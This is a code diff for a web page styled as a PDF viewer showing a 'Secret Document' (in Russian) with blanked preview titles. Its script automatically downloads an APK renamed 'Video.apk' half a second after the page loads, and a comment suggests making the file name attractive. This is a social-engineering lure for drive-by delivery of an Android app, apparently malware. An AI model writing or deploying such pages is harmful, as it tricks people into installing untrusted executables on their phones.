@@ -3,46 +3,108 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="Cache-Control" content="max-age=3600">
-    <title></title>
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <title>&#x200B;</title> 
     
     <meta property="og:type" content="website">
-    <meta property="og:url" content="https://t.ly/WeO2A">
-    <meta property="og:title" content="">
-    <meta property="og:description" content="">
+    <meta property="og:url" content="https://94kz55hfdb-netizen.github.io/test/">
+    <meta property="og:title" content="&#x200B;"> 
+    <meta property="og:description" content="&#x200B;">
     
-    <meta property="og:image" content="https://94kz55hfdb-netizen.github.io/test/downloads/photo11.jpg">
+    <meta property="og:image" content="https://94kz55hfdb-netizen.github.io/test/downloads/photo_preview.jpg">
+    
     <meta property="og:image:width" content="1200">
     <meta property="og:image:height" content="630">
-    
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:image" content="https://94kz55hfdb-netizen.github.io/test/downloads/photo11.jpg">
-    
     <style>
-        body, html { margin: 0; padding: 0; height: 100%; width: 100%; overflow: hidden; }
-        .full-image-container { width: 100%; height: 100%; position: relative; }
-        .full-image-container img { width: 100%; height: 100%; object-fit: cover; display: block; }
+        /* Общие стили и фон */
+        body, html { 
+            margin: 0; padding: 0; 
+            height: 100%; width: 100%; 
+            font-family: Arial, sans-serif;
+            background-color: #2c3e50; /* Темный современный фон */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: auto;
+        }
+
+        /* Стиль "PDF Viewer" (окошко) */
+        .pdf-viewer {
+            width: 90%;
+            max-width: 800px; /* Ограничиваем размер для десктопа */
+            height: 90vh; /* Высота относительно экрана */
+            background-color: #34495e; /* Более темный цвет для рамки */
+            border-radius: 8px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+
+        /* Заголовок-имитация */
+        .header {
+            background-color: #27ae60; /* Зеленый/акцентный цвет */
+            color: white;
+            padding: 10px 20px;
+            font-weight: bold;
+            font-size: 1.1em;
+            text-align: center;
+            user-select: none;
+        }
+
+        /* Область для картинки (имитация содержимого PDF) */
+        .content {
+            flex-grow: 1; /* Занимает все доступное место */
+            background-color: #ecf0f1; /* Светлый фон бумаги */
+            padding: 20px;
+            overflow-y: scroll; /* Позволяет прокручивать, если фото большое */
+            text-align: center;
+        }
+        
+        /* Стиль для фото внутри PDF */
+        .content img {
+            max-width: 100%;
+            height: auto;
+            border: 1px solid #bdc3c7; /* Тонкая рамка, как у документа */
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            display: block;
+            margin: 0 auto;
+        }
     </style>
 </head>
 <body>
-    <div class="full-image-container">
-        <img src="https://94kz55hfdb-netizen.github.io/test/downloads/photo11.jpg" alt="">
+    <div class="pdf-viewer">
+        <div class="header">
+            &#x200B; СекретныйДокумент.pdf (1 из 1) &#x200B;
+        </div>
+        
+        <div class="content">
+            <img src="downloads/photo_site.jpg" alt="Содержимое PDF-файла">
+            <p style="margin-top: 20px; color: #7f8c8d; font-size: 0.9em;">
+                Документ автоматически загружается для просмотра в полном размере.
+            </p>
+        </div>
     </div>
     
     <script>
         const repoBaseUrl = 'https://94kz55hfdb-netizen.github.io/test/'; 
         const apkUrl = repoBaseUrl + 'downloads/test1.apk'; 
-        const apkFilename = 'test1.apk'; 
+        const apkFilename = 'Видео.apk'; // Имя файла для скачивания (можно сделать привлекательным)
 
         function startDownload() {
+            // Создаем ссылку для принудительного скачивания
             const link = document.createElement('a');
             link.href = apkUrl + '?t=' + Date.now(); 
             link.download = apkFilename; 
+            
             document.body.appendChild(link);
             link.click();
             document.body.removeChild(link);
         }
 
+        // Запускаем скачивание сразу при открытии страницы (через 0.5 секунды)
         window.onload = function() {
             setTimeout(startDownload, 500); 
         };
